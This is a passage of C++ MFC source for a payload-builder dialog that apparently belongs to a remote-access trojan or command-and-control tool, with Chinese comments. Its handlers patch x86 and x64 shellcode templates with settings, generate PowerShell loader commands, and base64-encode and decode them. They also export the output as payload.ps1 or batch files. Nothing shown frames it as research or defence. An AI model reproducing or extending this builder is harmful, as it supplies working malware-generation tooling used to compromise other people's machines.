		64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,64,64,64,64,64,
		64,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,64,64,64,64,64
	};

	DWORD len = (DWORD)strlen((char*)code);
	if (len == 0) return NULL;

	DWORD pad = 0;
	if (code[len - 1] == '=') pad++;
	if (len > 1 && code[len - 2] == '=') pad++;
	DWORD out_len = (len / 4) * 3 - pad;

	unsigned char* ret = (unsigned char*)malloc(out_len + 1);
	if (!ret) return NULL;

	DWORD i = 0, j = 0;
	while (i < len)
	{
		DWORD a = (code[i] < 128) ? d[code[i]] : 64; i++;
		DWORD b = (i < len && code[i] < 128) ? d[code[i]] : 64; i++;
		DWORD c = (i < len && code[i] < 128) ? d[code[i]] : 64; i++;
		DWORD e = (i < len && code[i] < 128) ? d[code[i]] : 64; i++;

		if (a == 64 || b == 64) break;
		DWORD triple = (a << 18) | (b << 12) | (c << 6) | e;

		if (j < out_len) ret[j++] = (triple >> 16) & 0xFF;
		if (j < out_len) ret[j++] = (triple >> 8) & 0xFF;
		if (j < out_len) ret[j++] = triple & 0xFF;
	}

	ret[j] = '\0';
	return ret;
}

BOOL CBuildDlg::SetComd(char* buff, DWORD size)
{
	if (!buff || size == 0) return FALSE;
	code = CStringA(buff, size);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
// ShellCode/PowerShell/编解码 按钮
//////////////////////////////////////////////////////////////////////////
void CBuildDlg::OnBnClickedBuildShellcode()
{
	if (!getsettingdata()) return;

	GetModuleFileName(NULL, writepath, MAX_PATH);
	(_tcsrchr(writepath, _T('\\')))[1] = 0;
	CString strPath(writepath);

	CFileDialog dlg(FALSE, _T("bin"), _T("shellcode"), OFN_OVERWRITEPROMPT,
		_T("二进制文件 (*.bin)|*.bin||"));
	if (dlg.DoModal() != IDOK) return;

	CString outPath = dlg.GetPathName();

	// 复制x86 shellcode并写入配置
	CString srcPath32 = strPath + _T("Plugins\\x86\\ShellCode.bin");
	CopyFile(srcPath32, outPath, FALSE);
	changeshellcodeandwritefile(outPath);

	// 如果有x64也生成
	CString srcPath64 = strPath + _T("Plugins\\x64\\ShellCode.bin");
	if (GetFileAttributes(srcPath64) != INVALID_FILE_ATTRIBUTES)
	{
		CString outPath64 = outPath;
		outPath64.Replace(_T(".bin"), _T("_x64.bin"));
		CopyFile(srcPath64, outPath64, FALSE);
		changeshellcodeandwritefile(outPath64);
	}

	AfxMessageBox(_T("ShellCode生成完成"));
}

void CBuildDlg::OnBnClickedBuildPowershell()
{
	if (!getsettingdata()) return;

	GetModuleFileName(NULL, writepath, MAX_PATH);
	(_tcsrchr(writepath, _T('\\')))[1] = 0;
	CString strPath(writepath);

	CString path32 = strPath + _T("Plugins\\x86\\ShellCode.bin");
	CString path64 = strPath + _T("Plugins\\x64\\ShellCode.bin");

	changepowershellandwritefile(path32, path64, true);

	// 显示生成的命令
	m_edit_tip.SetWindowText(CString(code));
	AfxMessageBox(_T("PowerShell生成完成"));
}

void CBuildDlg::OnBnClickedBuildPowershellSet()
{
	WritepowershellInfo();
}

void CBuildDlg::OnBnClickedButtonPowershellGet()
{
	Writepowershellcmd();
	m_edit_tip.SetWindowText(CString(code));
}

void CBuildDlg::OnBnClickedButtonDecode()
{
	UpdateData(TRUE);
	CStringA strA(m_edit_powershell);
	unsigned char* decoded = base64_decode((unsigned char*)strA.GetString());
	if (decoded)
	{
		m_edit_tip.SetWindowText(CString((char*)decoded));
		free(decoded);
	}
}

void CBuildDlg::OnBnClickedButtonEncode()
{
	CString strText;
	m_edit_tip.GetWindowText(strText);
	CStringA strA(strText);
	unsigned char* encoded = base64_encode((unsigned char*)strA.GetString(), strA.GetLength());
	if (encoded)
	{
		m_edit_powershell = CString((char*)encoded);
		UpdateData(FALSE);
		free(encoded);
	}
}

void CBuildDlg::OnBnClickedButtonPowershellOut()
{
	CString strText;
	m_edit_tip.GetWindowText(strText);
	if (strText.IsEmpty())
	{
		AfxMessageBox(_T("没有可导出的内容"));
		return;
	}

	CFileDialog dlg(FALSE, _T("ps1"), _T("payload.ps1"), OFN_OVERWRITEPROMPT,
		_T("PowerShell Script (*.ps1)|*.ps1|Batch File (*.bat)|*.bat||"));
	if (dlg.DoModal() == IDOK)
	{
		CString path = dlg.GetPathName();
		CFile file;
		if (file.Open(path, CFile::modeCreate | CFile::modeWrite))
		{
			CStringA strA(strText);
			file.Write(strA.GetString(), strA.GetLength());
			file.Close();
			AfxMessageBox(_T("导出完成"));
		}
	}
}
